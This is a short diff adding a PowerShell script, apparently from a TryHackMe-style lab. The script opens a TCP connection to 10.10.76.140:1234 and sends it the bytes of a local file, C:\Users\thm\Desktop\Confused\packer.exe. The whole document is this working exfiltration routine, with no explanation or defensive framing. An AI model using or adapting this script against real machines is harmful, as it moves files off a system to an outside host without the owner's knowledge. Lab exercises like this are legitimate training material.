@@ -1,0 +1,7 @@
+$client = New-Object System.Net.Sockets.TcpClient("10.10.76.140", 1234)
+$stream = $client.GetStream()
+$bytes = [System.IO.File]::ReadAllBytes("C:\Users\thm\Desktop\Confused\packer.exe")
+$stream.Write($bytes, 0, $bytes.Length)
+$stream.Flush()
+$stream.Close()
+$client.Close()
